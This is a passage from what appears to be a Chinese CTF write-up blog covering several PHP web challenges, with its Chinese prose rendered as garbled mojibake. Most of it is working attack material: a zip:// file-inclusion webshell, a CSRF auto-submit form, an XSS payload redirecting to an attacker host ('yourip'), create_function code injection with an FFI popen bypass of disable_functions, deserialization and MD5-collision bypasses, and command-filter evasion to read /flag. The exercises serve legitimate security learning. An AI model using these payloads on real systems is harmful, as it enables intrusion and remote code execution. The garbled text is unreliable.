$_POST[&#39;password&#39;] == $_SESSION[&#39;password&#39;]) å¯è§è¿™é‡Œçš„æ¯”è¾ƒå¯†ç ç”¨çš„æ˜¯PHPå¼±ç±»å‹æ¯”è¾ƒï¼Œæˆ‘ä»¬åœ¨æŠŠsessionåˆ æ‰ï¼Œè¿™æ · $_SESSION[&#39;password&#39;] å˜æˆäº†Nullï¼Œå†å°†å¯†ç ç½®ä¸ºç©ºï¼Œå³å¯é€šè¿‡å¼±ç±»å‹æ¯”è¾ƒæˆåŠŸç™»å½•ï¼š å½“ç„¶PHPSESSIONä¸ä¸€å®šè¦ç½®ç©º,éšä¾¿è¾“å…¥ä¸€ä¸ªPHPSESSIONå°±å¯ä»¥äº†,è®©æˆ‘ä»¬çš„sessionæ–‡ä»¶ä¸å­˜åœ¨,æˆ‘ä»¬çš„$_SESSION[â€˜passwordâ€™]ä¹Ÿå°±ä¸ºç©ºäº† ç„¶åæˆåŠŸç™»å½•åˆ°äº†å¦ä¸€ä¸ªç•Œé¢ é˜…è¯»æºç å‘ç°æœ‰ä¸ªä¸Šä¼  è¿™é‡Œå°±æ˜¯ä¸€ä¸ªç™½åå•æœºåˆ¶ï¼Œç»“åˆå‰é¢çš„æ–‡ä»¶åŒ…å«ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“æƒ³åˆ°åˆ©ç”¨ å›¾ç‰‡é©¬+æ–‡ä»¶åŒ…å«æ¥getshell ä½†é—®é¢˜æ¥äº†ï¼Œæˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ è·¯å¾„ä¸º ./assets/img/upload/xxx.png ç„¶åæˆ‘ä»¬åŒ…å«çš„è¯ï¼Œåé¢ä¼šç»™æˆ‘ä»¬åŠ ä¸Š .php å°±ä¸èƒ½æˆåŠŸåŒ…å«äº†ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨zip:// ä¼ªåè®®ã€‚zip:// ä¼ªåè®®çš„æ ¼å¼ä¸ºï¼š zip:// [å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]#[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å] æˆ‘ä»¬æ„é€ ä¸€ä¸ª ä¸€å¥è¯çš„shell.php ï¼Œç„¶åå‹ç¼©æˆzipï¼Œæ”¹ä¸€ä¸‹åç¼€åï¼ˆè¿™é‡Œä¸å½±å“zipä¼ªåè®®ï¼‰æ”¹æˆpng ç„¶åæˆ‘ä»¬ä¸Šä¼ ï¼Œæœ€ååŒ…å«æˆåŠŸ getshell page=zip:///var/www/html/assets/img/upload/ce999132d18ebb87d093084b730adb3f05b22424.png%23shell æ‹¼æ¥ä¹‹åç›¸å½“äºå°±æ˜¯åŒ…å«äº† shell.phpã€‚ Crossæ‰«ä¸€ä¸‹ç›®å½•,å‘ç°robots.txt è®¿é—®ä¸€ä¸‹è¿™å‡ ä¸ªç›®å½• flagshopé¢˜ç›®éœ€è¦æˆ‘ä»¬èŠ±é’±å»ä¹°flag,ä½†æ˜¯æˆ‘ä»¬åªæœ‰11å—é’±,å¾—æƒ³åŠæ³•è®©è‡ªå·±çš„é’±å˜å¤š,ç„¶åç½‘ç«™æœ‰ä¸€ä¸ªè½¬è´¦åŠŸèƒ½,å¯ä»¥å°è¯•csrf è¿™é‡ŒæŠ“åŒ… æ˜¯postçš„è¯·æ±‚,ä¸èƒ½ç›´æ¥åœ¨urlä¸­æ„é€ csrf,å¾—åˆ©ç”¨javascriptæäº¤æˆ‘ä»¬çš„poc,å…ˆç”¨burpç”Ÿæˆpoc, ç„¶ååŠ ä¸€ç‚¹JavaScriptè®©ä»–è‡ªåŠ¨æäº¤ ction=&quot;http://60f43ecd-62a6-477c-99c0-ae67e9e12ad6.node3.buuoj.cn/transfer.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot; name=&quot;csrf&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;target&quot; value=&quot;Pp1ove&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;money&quot; value=&quot;1000000&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;messages&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt; &lt;/form&gt; &lt;script&gt; document.forms[0].submit(); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; å‡†å¤‡ä½¿ç”¨æŠ¥å‘Šæ¨¡å—å‘é€æˆ‘ä»¬çš„xssé“¾æ¥: æ¯”è¾ƒmd5çš„å‰äº”ä½,ç›´æ¥çˆ†ç ´å°±è¡Œ,copyä¸€ä¸‹ç½‘ä¸Šçš„è„šæœ¬ from multiprocessing.dummy import Pool as tp import hashlib knownMd5 = &#39;b5ffe&#39; #å·²çŸ¥çš„md5æ˜æ–‡ def md5(text): return hashlib.md5(str(text).encode(&#39;utf-8&#39;)).hexdigest() def findCode(code): key = code.split(&#39;:&#39;) start = int(key[0]) end = int(key[1]) for code in range(start, end): if md5(code)[0:5] == knownMd5: print code break list=[] for i in range(3): #è¿™é‡Œçš„range(number)æŒ‡çˆ†ç ´å‡ºå¤šå°‘ç»“æœåœæ­¢ list.append(str(10000000*i) + &#39;:&#39; + str(10000000*(i+1))) pool = tp() #ä½¿ç”¨å¤šçº¿ç¨‹åŠ å¿«çˆ†ç ´é€Ÿåº¦ pool.map(findCode, list) pool.close() pool.join() ç„¶åæäº¤æŠ¥å‘Š,åœ¨æŠ¥å‘Šå†…å®¹ä¸­å†™ &lt;script&gt;window.location.href=&quot;https://yourip/csrf.php&quot;&lt;/script&gt; ä½†æ˜¯æ²¡æœ‰æˆåŠŸ,å› ä¸ºæ˜¯åœ¨buuä¸Šåšçš„,è¿™é“é¢˜ä¹Ÿæ˜¯0è§£,ä¼°è®¡æ˜¯ç¯å¢ƒå‡ºäº†é—®é¢˜,å°±ä¸ç®¡äº† GreatphpçŸ¥è¯†ç‚¹ åˆ©ç”¨åŸç”Ÿç±»ç»•è¿‡md5=== åˆ©ç”¨å–åç¬¦å·~å–ä»£å¼•å·ç»•è¿‡preg_match ?&gt;&lt;?=ç»•è¿‡æŠ¥é”™ä¿¡æ¯,æ‰§è¡Œphpä»£ç ,ä»¥åŠ&lt;?=å’Œ&lt;?phpç›¸ç­‰ &lt;?php error_reporting(0); class SYCLOVER { public $syc; public $lover; public function __wakeup(){ if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) ){ if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#39;/&quot;, $this-&gt;syc, $match)){ eval($this-&gt;syc); } else { die(&quot;Try Hard !!&quot;); } } } } if (isset($_GET[&#39;great&#39;])){ unserialize($_GET[&#39;great&#39;]); } else { highlight_file(__FILE__); } ?&gt; å‰ç½®çŸ¥è¯†: exception::toString https://www.php.net/manual/zh/exception.tostring.php å› ä¸º (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover) åœ¨åŒä¸€è¡Œ,æ‰€ä»¥ä»–ä»¬çš„æŠ¥é”™ä¿¡æ¯æ˜¯ç›¸åŒçš„, Error: payload in /usercode/file.php:2 Stack trace: #0 {main} Error: payload in /usercode/file.php:2 Stack trace: #0 {main} å³å¯ä»¥ç»•è¿‡md5å’Œsha1å‡½æ•° ç„¶åæˆ‘ä»¬ä¸èƒ½ä½¿ç”¨ æ‹¬å·,æ— æ³•è°ƒç”¨å‡½æ•°,æ‰€ä»¥å¯ä»¥å°è¯•ç›´æ¥ä½¿ç”¨include â€œ/flagâ€ ï¼Œå› ä¸ºè¿‡æ»¤äº†å¼•å·,æˆ‘ä»¬ä½¿ç”¨urlå–åç»•è¿‡ï¼Œ &lt;?php $str=&quot;/flag&quot;; $b=urlencode(~$str); echo $b; //å¾—åˆ°bä¸º%D0%99%93%9E%98 payloadï¼š &lt;?php class SYCLOVER { public $syc; public $lover; public function __wakeup(){ if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) ){ if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#39;/&quot;, $this-&gt;syc, $match)){ eval($this-&gt;syc); } else { die(&quot;Try Hard !!&quot;); } } } } $str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;; /* æˆ–ä½¿ç”¨[~(å–å)][!%FF]çš„å½¢å¼ï¼Œ å³: $str = &quot;?&gt;&lt;?=include[~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;][!.urldecode(&quot;%FF&quot;).&quot;]?&gt;&quot;; $str = &quot;?&gt;&lt;?=include $_GET[_]?&gt;&quot;; */ $a= new SYCLOVER(); $b= new Exception($str,1);$c= new Exception($str,2); echo $b; echo &quot;&lt;/br&gt;&quot;; echo $c; $a-&gt;syc=$b; $a-&gt;lover=$c; echo urlencode(serialize($a)); è¿™é‡Œ $str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;; ä¸­ä¸ºä»€ä¹ˆè¦åœ¨å‰é¢åŠ ä¸Šä¸€ä¸ª ?&gt; å‘¢ï¼Ÿå› ä¸ºException ç±»ä¸ Error çš„ __toString æ–¹æ³•åœ¨eval()å‡½æ•°ä¸­è¾“å‡ºçš„ç»“æœæ˜¯ä¸å¯èƒ½æ§çš„ï¼Œå³è¾“å‡ºçš„æŠ¥é”™ä¿¡æ¯ä¸­ï¼Œpayloadå‰é¢è¿˜æœ‰ä¸€æ®µæ‚ä¹±ä¿¡æ¯â€œError: â€ å› ä¸ºæˆ‘ä»¬éœ€è¦æŠ¥é”™ä¿¡æ¯ç›¸åŒ,è€ŒæŠ¥é”™æ—¶ä¼šæ‰€ä»¥è¿˜å¾—è®© $b=new Exception($str,1);$c= new Exception($str,2);ä½äºåŒä¸€æ’ è‹¥æˆ‘ä»¬ä¸ä½äºåŒä¸€æ’,æŠ¥é”™çš„å­—ç¬¦ä¸²æ˜¯ä¸åŒçš„ FighterFightsInvinciblyçŸ¥è¯†ç‚¹ create_functionä»£ç æ³¨å…¥ FFIç»•è¿‡disable_function() create_functionä»£ç æ³¨å…¥: https://blog.51cto.com/lovexm/1743442 payload: ?fighter=create_function&amp;fights=&amp;invincibly=;}phpinfo();/* ç„¶åæ‰§è¡Œç³»ç»Ÿå‡½å‘½ä»¤,å‘ç°æ²¡æœ‰ååº”ï¼Œå¯èƒ½æ˜¯è®¾ç½®äº†disable_function æ ¹æ®é¢˜ç›® å¯èƒ½æ˜¯ç”¨FFIç»•è¿‡disable_function copyä¸€ä¸‹å¸ˆå‚…çš„ PHP 7.4 çš„ FFIï¼ˆForeign Function Interfaceï¼‰ï¼Œå³å¤–éƒ¨å‡½æ•°æ¥å£ï¼Œå…è®¸ä»ç”¨æˆ·åœ¨PHPä»£ç ä¸­å»è°ƒç”¨Cä»£ç ã€‚å½“PHPæ‰€æœ‰çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°è¢«ç¦ç”¨åï¼Œé€šè¿‡PHP 7.4çš„æ–°ç‰¹æ€§FFIå¯ä»¥å®ç°ç”¨PHPä»£ç è°ƒç”¨Cä»£ç çš„æ–¹å¼ï¼Œå…ˆå£°æ˜Cä¸­çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°æˆ–å…¶ä»–èƒ½å®ç°æˆ‘ä»¬éœ€æ±‚çš„å‡½æ•°ï¼Œç„¶åå†é€šè¿‡FFIå˜é‡è°ƒç”¨è¯¥Cå‡½æ•°å³å¯Bypass disable_functionsã€‚ æˆ‘ä»¬é¦–å…ˆå°è¯•è°ƒç”¨Cåº“çš„systemå‡½æ•°ï¼š PHP /?fighter=create_function&amp;fights=&amp;invincibly=;}$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);$ffi-&gt;system(&quot;ls / &gt; res.txt&quot;);echo file_get_contents(&quot;res.txt&quot;);/* Cåº“çš„systemå‡½æ•°æ‰§è¡Œæ˜¯æ²¡æœ‰å›æ˜¾çš„ï¼Œæ‰€ä»¥æˆ‘ä¹ˆåªèƒ½å°è¯•å†™æ–‡ä»¶ã€‚ä½†æ˜¯æ‰§è¡Œåå´å‘ç°æœ‰ä»»ä½•ç»“æœï¼Œå¯èƒ½æ˜¯æˆ‘ä»¬æ²¡æœ‰å†™æ–‡ä»¶çš„æƒé™ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬è¿˜è¦æ‰¾åˆ«çš„Cåº“å‡½æ•°ã€‚ Cåº“çš„systemå‡½æ•°è°ƒç”¨shellå‘½ä»¤ï¼Œåªèƒ½è·å–åˆ°shellå‘½ä»¤çš„è¿”å›å€¼ï¼Œè€Œä¸èƒ½è·å–shellå‘½ä»¤çš„è¾“å‡ºç»“æœï¼Œå¦‚æœæƒ³è·å–è¾“å‡ºç»“æœæˆ‘ä»¬å¯ä»¥ç”¨popenå‡½æ•°æ¥å®ç°ï¼š C FILE *popen(const char* command, const char* type); popen()å‡½æ•°ä¼šè°ƒç”¨fork()äº§ç”Ÿå­è¿›ç¨‹ï¼Œç„¶åä»å­è¿›ç¨‹ä¸­è°ƒç”¨/bin/sh -c æ¥æ‰§è¡Œå‚æ•° command çš„æŒ‡ä»¤ã€‚ å‚æ•° type å¯ä½¿ç”¨ â€œrâ€ä»£è¡¨è¯»å–ï¼Œâ€wâ€ä»£è¡¨å†™å…¥ã€‚ä¾ç…§æ­¤typeå€¼ï¼Œpopen()ä¼šå»ºç«‹ç®¡é“è¿åˆ°å­è¿›ç¨‹çš„æ ‡å‡†è¾“å‡ºè®¾å¤‡æˆ–æ ‡å‡†è¾“å…¥è®¾å¤‡ï¼Œç„¶åè¿”å›ä¸€ä¸ªæ–‡ä»¶æŒ‡é’ˆã€‚éšåè¿›ç¨‹ä¾¿å¯åˆ©ç”¨æ­¤æ–‡ä»¶æŒ‡é’ˆæ¥è¯»å–å­è¿›ç¨‹çš„è¾“å‡ºè®¾å¤‡æˆ–æ˜¯å†™å…¥åˆ°å­è¿›ç¨‹çš„æ ‡å‡†è¾“å…¥è®¾å¤‡ä¸­ã€‚ æ‰€ä»¥ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨Cåº“çš„popen()å‡½æ•°æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä½†è¦è¯»å–åˆ°ç»“æœè¿˜éœ€è¦Cåº“çš„fgetcç­‰å‡½æ•°ã€‚payloadå¦‚ä¸‹ï¼š PHP /?fighter=create_function&amp;fights=&amp;invincibly=;}$ffi = FFI::cdef(&quot;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&quot;,&quot;libc.so.6&quot;);$o = $ffi-&gt;popen(&quot;ls /&quot;,&quot;r&quot;);$d = &quot;&quot;;while(($c = $ffi-&gt;fgetc($o)) != -1){$d .= str_pad(strval(dechex($c)),2,&quot;0&quot;,0);}$ffi-&gt;pclose($o);echo hex2bin($d);/* æˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼š å‚è€ƒé“¾æ¥:https://whoamianony.top/2020/10/26/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/2020%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20WriteUp/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}]},{"title":"ctfshow-xss","slug":"ctfshow-xss","date":"2021-02-24T04:23:28.000Z","updated":"2021-02-24T15:33:10.358Z","comments":true,"path":"2021/02/24/ctfshow-xss/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/24/ctfshow-xss/","excerpt":"","text":"web316åå°„æ€§xss, åœ¨xssæµ‹è¯•å¹³å°ï¼ˆhttps://xss.pt/xss.phpï¼‰è·å–flag web317/318/319317å±è”½äº†scriptæ ‡ç­¾,318å±è”½äº†imgæ ‡ç­¾ ä½†æ˜¯è¿˜æ˜¯æœ‰å…¶ä»–æ ‡ç­¾å¯ä»¥å¼¹çª—ï¼Œå¦‚æ ‡ç­¾,è¯¦ç»†å¯ä»¥çœ‹:https://xz.aliyun.com/t/4067#toc-3 https://www.freebuf.com/articles/web/157589.html å…·ä½“åšé¢˜å°±ç”¨å¹³å°ä¸­æ²¡æœ‰scriptå’Œimgæ ‡ç­¾çš„ä»£ç å°±å¯ä»¥äº† ä½†æ˜¯317æ²¡å‡º,å¯èƒ½æ˜¯å¹³å°çš„é—®é¢˜ web320/321/322æµ‹äº†åŠå¤©éƒ½æ²¡æˆåŠŸ,åŸæ¥æ˜¯è¿‡æ»¤äº†ç©ºæ ¼ ç”¨tabä»£æ›¿ç©ºæ ¼å°±å¯ä»¥äº† web323","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}]},{"title":"å®‰æ´µæ¯","slug":"å®‰æ´µæ¯","date":"2021-02-20T07:00:51.000Z","updated":"2021-02-23T13:47:03.255Z","comments":true,"path":"2021/02/20/å®‰æ´µæ¯/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/20/å®‰æ´µæ¯/","excerpt":"","text":"[å®‰æ´µæ¯ 2018][å®‰æ´µæ¯ 2019]easy_webçŸ¥è¯†ç‚¹ å¯æ§imgï¼Œè·å¾—æºç  å¼ºç±»å‹æ¯”è¾ƒç»•è¿‡ è·å–æºç è¿›å»åæŸ¥çœ‹æºç ç­‰ï¼Œéƒ½æ²¡æœ‰æƒ³è¦çš„ä¸œè¥¿ï¼Œç„¶åå‘ç°æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œimgå’Œcmdï¼Œä»¥ä¸ºåªæ˜¯ä¸€ä¸ªç®€å•çš„å‘½ä»¤æ‰§è¡Œï¼Œä¸€ç›´ç»™cmdä¼ å‚ï¼Œå‘ç°è¿”å›ä¸€ç›´é”™è¯¯ï¼Œå»ç½‘ä¸Šæ‰¾å¤§ä½¬ä»¬çš„wpï¼Œæ‰çŸ¥é“è¿™é‡Œç–‘ä¼¼åˆ©ç”¨äº†ä¸€ä¸ªssrfæ¼æ´ï¼Œä»–åˆ©ç”¨imgè¯»å–æœ¬åœ°çš„æ–‡ä»¶ï¼Œç„¶åæ˜¾ç¤ºåœ¨å·¦ä¸Šè§’ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶imgçš„å‚æ•°ï¼ŒæŠŠå®ƒä¿®æ”¹æˆæˆ‘ä»¬éœ€è¦è¯»å–çš„æ–‡ä»¶ è¿™é‡Œé¦–å…ˆè¦ææ‡‚imgå‚æ•°çš„åŠ å¯†æ–¹å¼ï¼Œæœ¬ä»¥ä¸ºåªæ˜¯ä¸€ä¸ªç®€å•çš„base64åŠ å¯†ï¼Œè§£å¯†åå‘ç°å¹¶ä¸æ˜¯ï¼Œ ä¸¤æ¬¡base64è§£ç åå¾—åˆ°ï¼š è¿™é‡Œå¾ˆæ˜æ˜¾æ˜¯ä¸€ä¸ªHexåŠ å¯†ï¼Œè§£å¯†åä¸ºï¼š555.pngï¼Œ åŒç†ï¼Œå½“æˆ‘ä»¬æƒ³è¦è¯»å–index.phpæ–‡ä»¶æ—¶ï¼Œå…ˆæŠŠindex.phpè½¬æ¢æˆ16è¿›åˆ¶ï¼Œå†è¿›è¡Œä¸¤æ¬¡base64ç¼–ç ï¼Œå¾—åˆ°index.phpæºç  è§£ç ï¼š &lt;?php error_reporting(E_ALL || ~ E_NOTICE); header(&#39;content-type:text/html;charset=utf-8&#39;); $cmd = $_GET[&#39;cmd&#39;]; if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) header(&#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#39;); $file = hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;]))); $file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file); if (preg_match(&quot;/flag/i&quot;, $file)) { echo &#39;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#39;; die(&quot;xixiï½ no flag&quot;); } else { $txt = base64_encode(file_get_contents($file)); echo &quot;&lt;img src=&#39;data:image/gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;/img&gt;&quot;; echo &quot;&lt;br&gt;&quot;; } echo $cmd; echo &quot;&lt;br&gt;&quot;; if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#39;|\\&quot;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|&lt;|&gt;/i&quot;, $cmd)) { echo(&quot;forbid ~&quot;); echo &quot;&lt;br&gt;&quot;; } else { if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) { echo `$cmd`; } else { echo (&quot;md5 is funny ~&quot;); } } ?&gt; &lt;html&gt; &lt;style&gt; body{ background:url(./bj.png) no-repeat center center; background-size:cover; background-attachment:fixed; background-color:#CCCCCC; } &lt;/style&gt; &lt;body&gt; &lt;/body&gt; &lt;/html&gt; åˆ†æä¸€ä¸‹è¿™ä¸²ä»£ç ï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦ä¼ è¿›å»ä¸€ä¸ªcmdå‚æ•°ï¼Œç„¶åæ­£åˆ™åŒ¹é…ï¼Œcmdä¸èƒ½ç­‰äºlsï¼Œcatç­‰ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ca\\t,l\\sç­‰æ¥æ‰§è¡Œå‘½ä»¤ï¼Œç»•è¿‡åæ‰§è¡Œï¼š if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) { echo \\`$cmd\\`; } else { echo (&quot;md5 is funny ~&quot;); } è¿™é‡Œæ˜¯ä¸€ä¸ªå“ˆå¸Œæ¯”è¾ƒç¼ºé™·ï¼Œæˆ‘æ‰€çŸ¥é“çš„åªæœ‰æ•°ç»„ç»•è¿‡å’Œå¸¸è§„çš„0eç»•è¿‡ï¼Œä½†è¯•è¿‡ä¹‹åå‘ç°éƒ½ä¸è¡Œï¼Œè¿™é¢˜ç”¨çš„æ˜¯å¼ºç±»å‹ç¢°æ’,è‡³äºä¸ºä»€ä¹ˆå‰ä¸¤ç§ä¸è¡Œï¼Œæˆ‘è®¤ä¸ºoeç»•è¿‡ä¸è¡Œæ˜¯å› ä¸ºè¿™é‡Œç”¨çš„æ˜¯===ï¼Œè€Œæ•°ç»„ä¸è¡Œä½¿å› ä¸ºæ•°ç»„æ²¡æ³•è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œæ— æ³•ç»•è¿‡(string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] md5å¼ºç±»å‹ç¢°æ’$Param1=&quot;\\x4d\\xc9\\x68\\xff\\x0e\\xe3\\x5c\\x20\\x95\\x72\\xd4\\x77\\x7b\\x72\\x15\\x87\\xd3\\x6f\\xa7\\xb2\\x1b\\xdc\\x56\\xb7\\x4a\\x3d\\xc0\\x78\\x3e\\x7b\\x95\\x18\\xaf\\xbf\\xa2\\x00\\xa8\\x28\\x4b\\xf3\\x6e\\x8e\\x4b\\x55\\xb3\\x5f\\x42\\x75\\x93\\xd8\\x49\\x67\\x6d\\xa0\\xd1\\x55\\x5d\\x83\\x60\\xfb\\x5f\\x07\\xfe\\xa2&quot;; $Param2=&quot;\\x4d\\xc9\\x68\\xff\\x0e\\xe3\\x5c\\x20\\x95\\x72\\xd4\\x77\\x7b\\x72\\x15\\x87\\xd3\\x6f\\xa7\\xb2\\x1b\\xdc\\x56\\xb7\\x4a\\x3d\\xc0\\x78\\x3e\\x7b\\x95\\x18\\xaf\\xbf\\xa2\\x02\\xa8\\x28\\x4b\\xf3\\x6e\\x8e\\x4b\\x55\\xb3\\x5f\\x42\\x75\\x93\\xd8\\x49\\x67\\x6d\\xa0\\xd1\\xd5\\x5d\\x83\\x60\\xfb\\x5f\\x07\\xfe\\xa2&quot;; $data1=&quot;\\xd1\\x31\\xdd\\x02\\xc5\\xe6\\xee\\xc4\\x69\\x3d\\x9a\\x06\\x98\\xaf\\xf9\\x5c\\x2f\\xca\\xb5\\x07\\x12\\x46\\x7e\\xab\\x40\\x04\\x58\\x3e\\xb8\\xfb\\x7f\\x89\\x55\\xad\\x34\\x06\\x09\\xf4\\xb3\\x02\\x83\\xe4\\x88\\x83\\x25\\xf1\\x41\\x5a\\x08\\x51\\x25\\xe8\\xf7\\xcd\\xc9\\x9f\\xd9\\x1d\\xbd\\x72\\x80\\x37\\x3c\\x5b\\xd8\\x82\\x3e\\x31\\x56\\x34\\x8f\\x5b\\xae\\x6d\\xac\\xd4\\x36\\xc9\\x19\\xc6\\xdd\\x53\\xe2\\x34\\x87\\xda\\x03\\xfd\\x02\\x39\\x63\\x06\\xd2\\x48\\xcd\\xa0\\xe9\\x9f\\x33\\x42\\x0f\\x57\\x7e\\xe8\\xce\\x54\\xb6\\x70\\x80\\x28\\x0d\\x1e\\xc6\\x98\\x21\\xbc\\xb6\\xa8\\x83\\x93\\x96\\xf9\\x65\\xab\\x6f\\xf7\\x2a\\x70&quot;; $data2=&quot;\\xd1\\x31\\xdd\\x02\\xc5\\xe6\\xee\\xc4\\x69\\x3d\\x9a\\x06\\x98\\xaf\\xf9\\x5c\\x2f\\xca\\xb5\\x87\\x12\\x46\\x7e\\xab\\x40\\x04\\x58\\x3e\\xb8\\xfb\\x7f\\x89\\x55\\xad\\x34\\x06\\x09\\xf4\\xb3\\x02\\x83\\xe4\\x88\\x83\\x25\\x71\\x41\\x5a\\x08\\x51\\x25\\xe8\\xf7\\xcd\\xc9\\x9f\\xd9\\x1d\\xbd\\xf2\\x80\\x37\\x3c\\x5b\\xd8\\x82\\x3e\\x31\\x56\\x34\\x8f\\x5b\\xae\\x6d\\xac\\xd4\\x36\\xc9\\x19\\xc6\\xdd\\x53\\xe2\\xb4\\x87\\xda\\x03\\xfd\\x02\\x39\\x63\\x06\\xd2\\x48\\xcd\\xa0\\xe9\\x9f\\x33\\x42\\x0f\\x57\\x7e\\xe8\\xce\\x54\\xb6\\x70\\x80\\xa8\\x0d\\x1e\\xc6\\x98\\x21\\xbc\\xb6\\xa8\\x83\\x93\\x96\\xf9\\x65\\x2b\\x6f\\xf7\\x2a\\x70&quot;; a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2 &amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 è¿™é‡Œè¿‡æ»¤äº†å¤§éƒ¨åˆ†å‘½ä»¤æ‰§è¡Œçš„è¯­å¥ if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#39;|\\&quot;|\\`|;|,|\\*|\\?|\\ è¿™é‡Œæƒ³åˆ° linuxå‘½ä»¤ä¸­å¯ä»¥åŠ \\ï¼Œæ‰€ä»¥ç”šè‡³å¯ä»¥ca\\t /fl\\ag æŸ¥çœ‹å½“å‰ç›®å½•æœ‰æ²¡æœ‰flag: å¹¶æ²¡æœ‰ã€‚ã€‚ å»æ ¹ç›®å½•ä¸‹æ‰¾flagï¼š å‘ç°flagï¼Œè¯»å–ï¼š ç¦ç”¨catä¹‹åï¼Œcmd=/bin/c\\at%20/flag çœ‹ç½‘ä¸Šè¿˜æœ‰ä¸€ç§æ–¹æ³•è¯»å–flagï¼š sortå‘½ä»¤ï¼šsortå°†æ–‡ä»¶çš„æ¯ä¸€è¡Œä½œä¸ºä¸€ä¸ªå•ä½ï¼Œç›¸äº’æ¯”è¾ƒï¼Œæ¯”è¾ƒåŸåˆ™æ˜¯ä»é¦–å­—ç¬¦å‘åï¼Œä¾æ¬¡æŒ‰ASCIIç å€¼è¿›è¡Œæ¯”è¾ƒï¼Œæœ€åå°†ä»–ä»¬æŒ‰å‡åºè¾“å‡ºã€‚ å‚è€ƒé“¾æ¥ https://www.jianshu.com/p/21e3e1f74c08 